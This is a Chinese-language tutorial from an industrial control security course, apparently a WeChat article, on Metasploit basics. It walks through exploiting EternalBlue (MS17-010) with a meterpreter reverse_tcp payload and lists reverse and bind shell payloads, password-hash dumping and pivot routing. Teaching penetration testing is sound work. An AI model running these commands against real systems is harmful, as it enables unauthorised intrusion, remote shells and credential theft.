---
title: 【工业控制系统网络安全系列课程】第4课-工业控制系统的网络安全风险-Metasploit攻击框架基础（一）
url: https://mp.weixin.qq.com/s/AeZIBI4yL5gPg4MeG9SwhA
source: Doonsec's feed
date: 2026-04-18
fetch_date: 2026-04-19T04:46:51.575409
---

# 【工业控制系统网络安全系列课程】第4课-工业控制系统的网络安全风险-Metasploit攻击框架基础（一）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/icKb2wsWzy9OGY0zAl6wlkl0GcQRSZPbichCe9k6H8hEqnFVRkRic4aFl43bURKGZUWaI1PzAia5ibNWSk4LZFWJj3w/0?wx_fmt=jpeg)

# 【工业控制系统网络安全系列课程】第4课-工业控制系统的网络安全风险-Metasploit攻击框架基础（一）

原创

老付话安全
老付话安全

老付话安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_gif/7UnMUNqGIz071DWbJdrzpdJpDxlHDFtnMDlvK8TeibfibdovgH3vMKfIloQibicL6TTiaXQib28nacKJv8qx7AJNnm8g/640?wx_fmt=gif)

**点击蓝字**

**关注我们**

关注我，带给你不一样的精彩

世界因你的沉淀而出彩

**始于理论，源于实践，终于实战**

**老付话安全，每天一点点**

**激情永无限，进步看得见**

![](https://mmbiz.qpic.cn/mmbiz_png/lB1oaPhdMNvxZ67rEjeQWUFqwCxiacBblWHRAxzuoMfYPQXETZ7Y5bsGSLBPy2QGDKIbia74ruAWgJXhWkMlGgkA/640?wx_fmt=png)

**严正声明**

本号所写文章方法和工具只用于学习和交流，严禁使用文章所述内容中的方法未经许可的情况下对生产系统进行方法验证实施，发生一切问题由相关个人承担法律责任，其与本号无关。

特此声明！！！

本文字数：

3550字

阅读时间：

10分钟

![](https://mmbiz.qpic.cn/mmbiz_png/icKb2wsWzy9PEjp9eSNQiaUOd1c6YqwgfmkPpdz6eLJ8DdlDNUBqveKtiacEVRcfsmdBFkicRIT6Jx5UjOKE0ia3ovA/640?from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/icKb2wsWzy9PEjp9eSNQiaUOd1c6YqwgfmWXkibyqRGYwGCtfKsZVPyXib1Hnia07via66RuViaMOMicKXfLQeRKxgd9Ow/640?from=appmsg)

Metasploit  MS 框架概述

* Metasploit框架既是一个 **渗透测试** 平台，也是一个 **开发** 平台，用于创建安全工具和漏洞利用。
* 该框架由 **库（Rex）**、**模块（Modules）**、**接口（Interfaces）** 和 **工具（Tools）** 组成。
* 该框架的基本功能是模块启动器，允许用户配置漏洞利用模块并在目标系统上启动它。

> 说明：
>
> * **库**（如Rex）提供底层网络、套接字、协议处理等基础功能。
> * **模块**包括漏洞利用（exploit）、辅助（auxiliary）、有效载荷（payload）、编码器（encoder）、后渗透（post）等。
> * **接口**包括命令行（msfconsole）、图形界面（Armitage）、Web界面等。
> * **工具**包括msfvenom、msfdb、msfrpc等独立实用程序。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tE7RtngPUmibylIfvjsA2GBaSGgxTKoib9icHKC0ibGQQYBwSHh9kQPLBvaPmVRbDrKo6LWXjleIO2ooiaPSofsjy4HpOvwpcWu8UCd1DlbCwgVg/640?wx_fmt=png&from=appmsg)

## Metasploit 基本漏洞利用过程（十个步骤）

| 步骤 | 命令/动作 | 目的与说明 |
| --- | --- | --- |
| 1 | **显示漏洞利用** | 查看可用的漏洞利用模块列表，或确认当前已选模块。常用 `show exploits` 或直接输入模块路径。 |
| 2 | **使用漏洞利用** `use <完整漏洞利用名称>` | 选择一个特定的漏洞利用模块，进入该模块的上下文。例如：`use exploit/windows/smb/ms17_010_eternalblue` |
| 3 | **显示选项** `show options` | 查看当前漏洞利用模块需要配置的参数（如 RHOST、RPORT、SMBUser 等），以及哪些是必填项。 |
| 4 | **设置选项** `set <选项名称> <值>` | 为目标系统配置必要参数，例如：`set RHOST 192.168.1.10`。可多次执行以设置多个选项。 |
| 5 | **显示有效载荷** `show payloads` | 列出可与当前漏洞利用模块兼容的所有有效载荷（如反向 shell、Meterpreter、VNC 注入等）。 |
| 6 | **设置有效载荷** `set PAYLOAD <完整有效载荷名称>` | 选择要投递到目标系统上的有效载荷。例如：`set PAYLOAD windows/x64/meterpreter/reverse_tcp` |
| 7 | **显示选项** （再次） `show options` | 查看新设置的有效载荷模块的专属选项（如 LHOST、LPORT、EXITFUNC 等），并确认哪些尚未配置。 |
| 8 | **设置选项** （再次） `set <选项名称> <值>` | 为有效载荷配置必要参数。典型设置： • `set LHOST <攻击机IP>` • `set LPORT <监听端口>` • `set EXITFUNC thread`（可选，提升稳定性） |
| 9 | **利用** `exploit` 或 `run` | 启动攻击。Metasploit 将发送漏洞利用数据包，若成功则在目标上执行有效载荷，并建立会话（如 shell 或 Meterpreter）。 |
| 10 | **交互与后渗透** | 成功利用后会打开一个会话（session）。使用 `sessions -i <ID>` 进入交互，进行后续操作（如提权、信息收集、横向移动等）。 |

### 说明

* **为什么需要两次“显示选项”和“设置选项”？**
  因为漏洞利用模块和有效载荷模块各自拥有独立的配置参数。必须先配置漏洞利用的目标地址等，再配置有效载荷的反弹地址等。
* **常见易错点**：

+ 忘记设置 `LHOST` 导致反向连接失败。
+ `RHOST` 和 `LHOST` 混淆。
+ 未设置 `EXITFUNC` 导致漏洞利用后目标服务崩溃，无法维持会话。

* **快速执行技巧**：
  可以使用 `setg` 设置全局变量（如 `setg LHOST 10.0.0.5`），避免在每个模块中重复设置。

## MSF 常用命令（msfconsole 内）

| 命令 | 说明 | 示例 |
| --- | --- | --- |
| `help` 或 `?` | 显示帮助信息，可跟具体命令查看用法 | `help route` |
| `search <关键词>` | 搜索模块（漏洞利用、辅助、有效负载等） | `search ms17-010` |
| `use <模块路径>` | 使用指定模块 | `use exploit/windows/smb/ms17_010_eternalblue` |
| `show options` | 显示当前模块的配置参数（必填项标为 required） | `show options` |
| `show targets` | 显示漏洞利用支持的目标系统类型 | `show targets` |
| `show payloads` | 显示与当前漏洞利用兼容的有效负载列表 | `show payloads` |
| `set <参数名> <值>` | 设置参数（如 RHOST、LHOST、RPORT） | `set RHOST 192.168.1.10` |
| `setg <参数名> <值>` | 设置全局参数，所有模块继承 | `setg LHOST 10.0.0.5` |
| `unset <参数名>` | 清除参数设置 | `unset RHOST` |
| `run` 或 `exploit` | 执行当前模块（攻击） | `run` |
| `check` | 检查目标是否可能易受攻击（不实际利用） | `check` |
| `sessions -l` | 列出所有已建立的会话 | `sessions -l` |
| `sessions -i <ID>` | 与指定会话交互 | `sessions -i 1` |
| `jobs` | 查看后台运行的作业 | `jobs` |
| `kill <JobID>` | 终止后台作业 | `kill 0` |
| `background` | 将当前会话置于后台（从 meterpreter 返回 msfconsole） | `background` |
| `route` | 查看或添加路由（用于横向移动） | `route add 192.168.2.0/24 1` |
| `loadpath <路径>` | 加载自定义模块路径 | `loadpath /opt/custom_modules` |

## MSF 漏洞利用示例（以永恒之蓝为例）

```
# 1. 启动 msfconsolemsfconsole# 2. 搜索漏洞模块search ms17-010# 3. 使用漏洞利用模块use exploit/windows/smb/ms17_010_eternalblue# 4. 查看所需选项show options# 5. 设置目标 IP 和本机 IP（用于反向连接）set RHOST 192.168.1.100set LHOST 192.168.1.50# 6. 查看兼容的有效负载show payloads# 7. 选择 meterpreter 反向 tcp 有效负载set PAYLOAD windows/x64/meterpreter/reverse_tcp# 8. 再次检查选项（确保 LHOST/LPORT 已设）show options# 9. 可选：设置监听端口set LPORT 4444# 10. 执行攻击run# 成功后会得到 meterpreter 会话
```

其他常见漏洞利用示例：

* `use exploit/multi/handler`：独立监听器，用于接收反向 shell。
* `use auxiliary/scanner/portscan/tcp`：TCP 端口扫描。
* `use post/windows/gather/hashdump`：后渗透模块，抓取密码哈希。
* set PAYLOAD windows/meterpreter/bind\_tcp ：在目标 Windows 系统上开放 TCP 端口（默认 4444），等待攻击者主动连接，适用于目标可直接访问且出站受限的环境。

* `set PAYLOAD linux/x86/meterpreter/reverse_tcp` ：在目标 Linux（x86）系统上执行后，主动反向连接攻击者监听的 TCP 端口，用于绕过入站防火墙，是最常用的反向连接 payload。
* `set PAYLOAD windows/meterpreter/reverse_udp` ：使用 UDP 协议进行反向连接，适用于 TCP 被严格过滤但 UDP 流量允许外发的特殊网络环境。
* `set PAYLOAD windows/x64/meterpreter/bind_ipv6_tcp` ：在 64 位 Windows 目标上监听 IPv6 地址的 TCP 端口，用于纯 IPv6 网络环境或绕过仅过滤 IPv4 的访问控制。
* `set PAYLOAD linux/meterpreter/reverse_nonx_tcp` ：专为 Linux 平台设计，使用反向 TCP 连接，并包含绕过 NX（数据执行保护）内存防护技术的处理逻辑，适用于启用了 NX 的目标。
* `set PAYLOAD windows/meterpreter/reverse_tcp_allports` ：反向 TCP 连接 payload 的增强版，会尝试多个端口（遍历或预设范围）与攻击者建立连接，用于提高在端口限制或动态变化环境下的成功率。

##

**往期内容**回顾****

|  |
| --- |
| [【工业控制系统网络安全系列课程】第2课-工业控制系统的网络安全风险-过程控制漏洞利用过程](https://mp.weixin.qq.com/s?__biz=MzI0MzM3NTQ5MA==&mid=2247486037&idx=1&sn=611a127747a9b05e02a2ef4bf1114e0c&scene=21#wechat_redirect) |
| [【工业控制系统网络安全系列课程】第2课-工业控制系统的网络安全风险-过程控制漏洞利用（一）ICS过程控制漏洞概述](https://mp.weixin.qq.com/s?__biz=MzI0MzM3NTQ5MA==&mid=2247486039&idx=1&sn=9da3debdeee21e4d6eca9efc0838d3cd&scene=21#wechat_redirect) |
| [【工业控制系统网络安全系列课程】第2课-工业控制系统的网络安全风险-过程控制漏洞利用（二）典型漏洞利用路径](https://mp.weixin.qq.com/s?__biz=MzI0MzM3NTQ5MA==&mid=2247486040&idx=1&sn=500f7e115c7abb2e44d3ee9326382085&scene=21#wechat_redirect) |

@请赐予我力量，关注和转发是最大的支持@

欢迎扫码进群交流

![](https://mmbiz.qpic.cn/mmbiz_jpg/tE7RtngPUm85FtZKuNRCbqvutVXOSqIphpS43hcaArSJeUjiaWxOLoibkPBlQbE6FdlN2wic4Lf7tqq7ibouYzjfzQcnRkWBGYhp9ZMVOP71PVI/640?wx_fmt=jpeg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/icKb2wsWzy9MFl1LCgCibJeCV1F21OkZHVYX4tY8b7YkTdXSqhre8sozecX77R5KgBpvzygTIrHiaW21ytB2FzvrQ/0?wx_fmt=png)

老付话安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/icKb2wsWzy9MFl1LCgCibJeCV1F21OkZHVYX4tY8b7YkTdXSqhre8sozecX77R5KgBpvzygTIrHiaW21ytB2FzvrQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过